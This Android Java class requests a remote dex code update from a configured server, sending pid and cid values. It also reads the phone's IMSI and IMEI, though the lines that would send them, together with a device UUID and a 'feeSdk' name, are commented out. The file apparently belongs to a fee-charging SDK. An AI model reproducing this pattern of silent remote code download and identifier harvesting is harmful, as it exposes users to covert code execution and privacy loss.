package com.channel.di.net;

import android.content.Context;
import android.text.TextUtils;

import com.channel.di.utils.Constants;
import com.channel.ef.PayManager;
import com.gandalf.daemon.utils.DeviceUuidFactory;
import com.msm.modu1e.utils.IMSInfo;
import com.msm.modu1e.utils.ImsiUtil;
import com.zhy.http.okhttp.OkHttpUtils;
import com.zhy.http.okhttp.callback.Callback;

import java.util.HashMap;
import java.util.Map;

/**
 * Created by as on 17-6-21.
 */

public class DexRequestHelper {
    private static DexRequestHelper INSTANCE = null;
    private Context mContext = null;

    public static DexRequestHelper getInstance(Context context) {
        if (INSTANCE == null) {
            INSTANCE = new DexRequestHelper(context);
        }
        return INSTANCE;
    }

    private DexRequestHelper(Context context) {
        mContext = context;
    }


    public void requestDownloalDex(/*String payTaskId, */Callback<String> callback) {
        /*if (TextUtils.isEmpty(payTaskId)) {
            return;
        }*/
        try {
            Map<String, String> params = new HashMap<String, String>();
            String pid = PayManager.getInstance(mContext).getPid();
            String cid = PayManager.getInstance(mContext).getCid();
            if (TextUtils.isEmpty(pid) || TextUtils.isEmpty(cid)) {
                return;
            }
            IMSInfo imsiInfo = ImsiUtil.getIMSInfo(mContext);
            String imsi = "";
            if (imsiInfo != null) {
                String i1 = imsiInfo.imsi_1;
                String i2 = imsiInfo.imsi_2;
                if (!TextUtils.isEmpty(i1)) {
                    imsi = i1;
                } else if (!TextUtils.isEmpty(i2)) {
                    imsi = i2;
                }
            }
            if (TextUtils.isEmpty(imsi)) {
                imsi = ImsiUtil.getIMSIWithAPI(mContext);
            }
            String imei = ImsiUtil.getIMEIWithAPI(mContext);
            params.put("pid", pid);
            params.put("cid", cid);
           // params.put("imei", imei);
           // params.put("imsi", imsi);
           // params.put("hasSecurityApp", "1");
          //  params.put("name", "feeSdk2_SdkCloud");
          //  params.put("uuid", new DeviceUuidFactory(mContext).getDeviceUuid());
            OkHttpUtils.get().params(params).url(Constants.URL_DEX_UPDATE).build().execute(callback);
        } catch (IllegalArgumentException e) {
            e.printStackTrace();
        }

    }
}
